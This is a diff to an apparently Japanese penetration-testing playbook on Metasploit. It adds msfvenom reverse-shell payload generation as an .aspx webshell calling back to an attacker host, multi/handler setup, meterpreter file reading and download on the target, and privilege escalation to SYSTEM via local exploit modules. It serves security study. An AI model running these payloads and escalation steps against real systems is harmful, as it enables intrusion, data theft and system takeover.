@@ -99,6 +99,51 @@ msf > set LHOST [IF_NAME]             # または IF 名で渡す（IP が変わ
 | 手動 PoC / スクリプト / コマンドインジェクション | `nc -lvnp [PORT]` を自分で先に起動 |
 | msf モジュール（reverse 系 payload） | **nc を立てない** — msf が `run` 時に自動起動 |
 
+### 3.1 multi/handler — 自前で配布したペイロードを受ける
+
+`msfvenom` で生成したペイロード（webshell / アップロード / FTP 書込 / コマンド注入で**外部経由で**ターゲットに配置・実行させたもの）は、exploit モジュールを使っていないので handler が自動起動しない。**`use exploit/multi/handler` で受信側だけを立てる**。
+
+**コマンド:**
+
+```bash
+# [Attacker] 配布するペイロードを生成（payload は handler と完全一致させる）
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ATTACKER_IP] LPORT=[PORT] -f aspx > shell.aspx
+
+# [Attacker] 受信側 handler を起動（payload / LHOST / LPORT を msfvenom と一致させる）
+msfconsole -q -x "use exploit/multi/handler; \
+  set payload windows/meterpreter/reverse_tcp; \
+  set LHOST [ATTACKER_IP]; set LPORT [PORT]; \
+  set ExitOnSession false; exploit -j"
+# → 別経路（ブラウザで .aspx を開く等）でペイロードを実行させると session が開く
+```
+
+**観測される出力 → 次のアクション:**
+
+| 出力 | 示唆 | 次のアクション |
+|---|---|---|
+| `exploit -j` 後すぐ `Exploit completed, but no session was created` | **エラーではない** — `-j` はジョブとして listen を開始して即プロンプトに戻るだけ。この後に `Sending stage` → `session opened` が続く | ペイロードを実行させて session を待つ |
+| `Meterpreter session N opened` | 受信成功 | §5 / §6 / §7 へ |
+| いつまでも session が開かない | payload 不一致 / LHOST 誤 IF / FW | payload を msfvenom と一致させる・`ip a` で LHOST 確認・§3.2 を確認 |
+
+**注意:** handler の `payload` / `LHOST` / `LPORT` は **msfvenom で作ったものと完全一致**させる。1 つでもズレると stager は接続できても session 化しない。
+
+### 3.2 staged と stageless — nc で meterpreter を受けられない理由
+
+ペイロードには 2 方式があり、**受信側の要件が違う**。これを知らないと「nc で待ち受けたのに meterpreter が来ない」で詰まる。
+
+| 方式 | payload 名の見分け | 動作 | nc で受けられるか |
+|---|---|---|---|
+| **staged（段階型）** | 区切りが `/`：`windows/meterpreter/reverse_tcp` | 小さな stager だけ送り込み、接続後に **handler が stage 本体（数百 KB の meterpreter DLL）を送り返す** | **不可**（nc は stage を送り返せない） |
+| **stageless（一体型）** | 区切りが `_`：`windows/meterpreter_reverse_tcp` / `windows/shell_reverse_tcp` | ペイロード全体を 1 度に送る。接続したら即シェル | shell 系なら **可**（生の cmd パイプ） |
+
+**判断:**
+
+- **staged meterpreter（`.../reverse_tcp`）を生成したなら、受信は必ず `multi/handler`**。`nc -lvnp` で待ち受けると、stager は接続してくるが handler が居ないので stage を受け取れず、セッションにならない（`Sending stage` が出ない／接続が即死する）。
+- **nc で受けたいなら、stageless の素のシェルを生成する**：`msfvenom -p windows/shell_reverse_tcp LHOST=.. LPORT=.. -f aspx`。これは meterpreter ではなく cmd.exe の生パイプなので nc で対話できる（ただし meterpreter の便利機能は使えない）。
+- ログで `Sending stage (NNNNNN bytes)` が出ていれば staged を handler が正しく受けている証拠。
+
+> **よくある失敗（実際に起きる）:** staged meterpreter を `msfvenom` で作り、`nc -lvnp [PORT]` で待ち受け → ブラウザで webshell を開くと nc に接続は来るが無反応。nc を閉じて `multi/handler` を同じ payload/LPORT で立て直し、もう一度 webshell を開けば session が開く。
+
 ---
 
 ## 4. エラー読み分け表
@@ -125,7 +170,20 @@ msf > set LHOST [IF_NAME]             # または IF 名で渡す（IP が変わ
 
 **着火条件:** 既定ペイロード（`windows/meterpreter/reverse_tcp` 等）でセッションが開いた直後。プロンプトが `meterpreter >` になっている。
 
-> **meterpreter は OS のシェルそのものではない。** `id` / `whoami` / `ls` などの OS コマンドをそのまま打っても `Unknown command: id` のように弾かれる。meterpreter 専用コマンドで操作するか、`shell` で OS シェルに落ちてから OS コマンドを打つ。
+> **【最重要】プロンプトを取り違えない（3 種類ある）:** msf 操作中は **3 つのプロンプト**が出てくる。どこにいるかで「コマンドが誰に対して実行されるか」が変わる。
+>
+> | プロンプト | コマンドの実行先 | ターゲットを触れるか |
+> |---|---|---|
+> | `msf exploit(...) >`（msfconsole） | **未知のコマンドはテスター端末（手元）のローカルシェルに渡される** | ✕ |
+> | `meterpreter >` | ターゲット（meterpreter 専用コマンド経由） | ○ |
+> | `C:\> ` 等（`shell` で落ちた OS シェル） | ターゲット（OS コマンド） | ○ |
+>
+> **典型的な取り違え（実際に起きる）:**
+> - `msf exploit(multi/handler) >` の状態で `whoami` と打つと、**ターゲットではなく手元の端末で `whoami` が走り、自分のローカルユーザー名が返る**（msfconsole が未知コマンドをローカルシェルにパススルーするため。`[*] exec: whoami` と表示されるのが目印）。`dir` も同様に**手元のディレクトリ**が出る。
+> - 同じ msf プロンプトで `getuid` と打つと `Unknown command: getuid`（getuid は meterpreter コマンドで msfconsole コマンドではない）。
+> - **ターゲットを触るには必ず `sessions -i [ID]` でセッションに入ってから**（`meterpreter >` になる）。`sessions -l` で一覧、`Information` 列にターゲットのユーザー（例: `IIS APPPOOL\Web @ [HOSTNAME]`）が出る。
+
+> **meterpreter は OS のシェルそのものではない。** `meterpreter >` でも `id` / `whoami` などの OS コマンドをそのまま打つと `Unknown command: id` のように弾かれる。meterpreter 専用コマンド（`getuid` 等）で操作するか、`shell` で OS シェルに落ちてから OS コマンドを打つ。
 
 **コマンド:**
 
@@ -159,6 +217,82 @@ net user             :: ローカルアカウント一覧
 
 ---
 
+## 6. Meterpreter のファイル操作とパス指定（`\\` エスケープ）
+
+**着火条件:** `meterpreter >` でターゲットのファイルを `cat` / `ls` / `download` するとき。
+
+> **なぜ `\` を二重にするのか:** meterpreter のコマンド行は **`\` をエスケープ文字として解釈する**（Ruby のトークナイザ由来）。`c:\Users\[USER]` と書くと `\U` 等がエスケープとして食われ、パスが壊れて `The system cannot find the file specified` になる。**クォートで囲んでもエスケープは効く**ため、次のどちらかで書く:
+>
+> - **バックスラッシュを二重に**：`cat "c:\\Users\\[USER]\\Desktop\\[FILE]"`
+> - **スラッシュに置き換える**（Windows パスでも meterpreter は受け付ける）：`cat "c:/Users/[USER]/Desktop/[FILE]"`
+
+**コマンド:**
+
+```bash
+# [Target/meterpreter] まず ls で実ファイル名を確認してから cat する
+meterpreter > ls "c:\\Users\\[USER]\\Desktop\\"
+meterpreter > cat "c:\\Users\\[USER]\\Desktop\\[FILE]"
+# または スラッシュ表記
+meterpreter > cat "c:/Users/[USER]/Desktop/[FILE]"
+
+# [Target/meterpreter] ファイル取得・環境変数展開
+meterpreter > download "c:\\Users\\[USER]\\Desktop\\[FILE]"
+meterpreter > cd %TEMP%        # 環境変数は %VAR% で展開できる
+```
+
+**観測される出力 → 次のアクション:**
+
+| 出力 | 示唆 | 次のアクション |
+|---|---|---|
+| `cat` が `stdapi_fs_stat: Operation failed: The system cannot find the file specified` | パスのエスケープ崩れ **または** ファイル名違い | `\\` / `/` で書き直す → それでも出なければ親ディレクトリを `ls` して実名を確認 |
+| `[-] ... is a directory` | ディレクトリを `cat` した | `ls` に変える |
+| `ls` で想定と違うファイル名（拡張子が違う等） | 参考にした手順書のパスを鵜呑みにしていた | **手順書のパスを盲信せず、必ず `ls` で実名を確認してから `cat`** する |
+
+**注意:** 既存の writeup / 他人の手順のパスをそのままコピーして失敗するのは頻出パターン。OS の表示設定（既知の拡張子を隠す等）で「画面上のファイル名」と「実ファイル名」がずれることもある。`ls` で確定 → `cat`/`download` の順を徹底する。
+
+---
+
+## 7. セッションからの権限昇格探索（local_exploit_suggester / local exploit）
+
+**着火条件:** 低権限のセッションを取得済み（例: サービスアカウント）で、ローカル権限昇格の候補を探したい。
+
+**攻撃者の思考トレース:** 「今あるセッション・今ある情報から、どの昇格 exploit が効くか」を探す起点が `sysinfo`。**OS 版数・ビルド・アーキ（x86 / x64）** を押さえてから候補を列挙する。`local_exploit_suggester` はセッション越しにローカル昇格 exploit 群との突合を自動化してくれる（**x86 は判定が比較的信頼でき、x64 は精度が落ちる**）。
+
+**コマンド:**
+
+```bash
+# [Target/meterpreter] まず素性を確認（アーキ・OS 版数・ビルドが選定の軸）
+meterpreter > getuid          # 今の権限（例: サービスアカウントで非管理者）
+meterpreter > sysinfo         # OS / Build / Architecture（x86 か x64 か）
+
+# [Attacker/msf] セッションを背景化して suggester にかける
+meterpreter > background
+msf > use post/multi/recon/local_exploit_suggester
+msf > set SESSION [ID]
+msf > run
+# → "appears to be vulnerable" の候補が列挙される
+
+# [Attacker/msf] 候補から 1 つ選んで local exploit を実行（新しい昇格済みセッションが開く）
+msf > use exploit/windows/local/[SUGGESTED_MODULE]
+msf > set SESSION [ID]
+msf > set LHOST [ATTACKER_IP]
+msf > set LPORT [別ポート]      # 既存 handler と別ポートにする
+msf > run
+```
+
+**観測される出力 → 次のアクション:**
+
+| 出力 | 示唆 | 次のアクション |
+|---|---|---|
+| `[+] ... appears to be vulnerable` の一覧 | **候補であって確証ではない**。複数出るのが普通 | 上から順に試す（信頼性・副作用の小さいものを優先） |
+| `bypassuac_*` 系が候補に出る | UAC バイパスは**対象アカウントが Administrators 所属である前提** | サービスアカウント等の非管理者では失敗する → kernel / token 系の候補へ |
+| local exploit 実行後 `Meterpreter session N opened` → `getuid` が `NT AUTHORITY\SYSTEM` | 昇格成功 | `../04_Post_Access_Windows_AD/Enumeration_Checklist.md`（昇格後の横展開観点） |
+| local exploit が `Exploit aborted ... not writable` / ファイル書込で失敗 | local exploit は**ターゲットにファイルを書く**。既定 cwd が書込不可（IIS 等のサービスは `c:\windows\system32\inetsrv` 等） | 先に書込可能ディレクトリへ移動：`meterpreter > cd %TEMP%`（または `cd c:\\windows\\temp`）してから再実行 |
+
+**注意:** `local_exploit_suggester` の結果は **searchsploit / 手動列挙の置き換えではなく入口**。kernel 系 exploit は不発時にターゲットを不安定化（BSOD）させうるので、`whoami /priv`（token 系昇格の可否）やサービス・スケジュールタスクの設定不備など、より低リスクな経路も並行で確認する → `../04_Post_Access_Windows_AD/Enumeration_Checklist.md`。書込可能 cwd の事前確認（`echo test > %TEMP%\test.txt`）も同チェックリスト参照。
+
+---
+
 ## 刺さらなかったとき（全体）
 
 | 状況 | 推定原因 | 代替手段 |
@@ -186,7 +320,9 @@ net user             :: ローカルアカウント一覧
 ## 関連技術
 
 - 前：版数 → CVE 照合 → msf モジュール特定 → `Searchsploit.md`
+- 前：msfvenom で作った webshell の言語選択・配布（§3.1 multi/handler で受信） → `../02_Initial_Access/Web_Vulnerabilities/Web_Shells.md`
 - 後：msf セッション安定化 → `../03_Post_Access_Linux/Shell_Stabilization.md`
+- 後：§7 local exploit で SYSTEM 取得後の Windows 列挙・横展開 → `../04_Post_Access_Windows_AD/Enumeration_Checklist.md`
 - 関連：リバースシェルの原理・LHOST インターフェース選択 → `../06_Concepts/Reverse_Shell.md`
 - 関連：usermap_script モジュールの例 → `../02_Initial_Access/Samba_Exploitation.md`
 - 関連：distcc_exec モジュールの例 → `../02_Initial_Access/distcc_Exploitation.md`
